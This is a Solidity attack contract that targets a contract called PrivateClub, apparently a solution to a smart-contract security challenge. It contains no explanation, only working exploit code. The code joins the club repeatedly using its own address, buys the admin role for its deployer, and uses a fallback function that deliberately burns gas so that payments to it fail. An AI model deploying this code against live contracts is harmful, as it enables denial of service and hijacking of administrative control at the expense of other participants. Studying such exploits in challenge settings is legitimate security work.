// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "./PrivateClub.sol";

contract Attack
{
    PrivateClub target;
    uint256 counter;
    bool first_phase_done;
    address owner;

    constructor(address payable _target)
    {
        target = PrivateClub(_target);
        counter = 0;
        owner = msg.sender;
        first_phase_done = false;
    }

    function attack(uint256 turn) payable public
    {
        address[] memory address_array = new address[](turn);
        for (uint i = 0; i < turn; i++)
        {
            address_array[i] = address(this);
        }
        target.becomeMember{value:turn * 1e18}(address_array);
    }

    function attack2() payable public
    {
        target.buyAdminRole{value: 10 ether}(owner);
    }

    function finishFirstPhase() public
    {
        first_phase_done = true;
    }

    fallback() external payable
    {
        if (first_phase_done)
        {
            uint256 gas = gasleft();
            while (gas - 150000 > gasleft())
            {
                counter++;
            }
        }
    }
}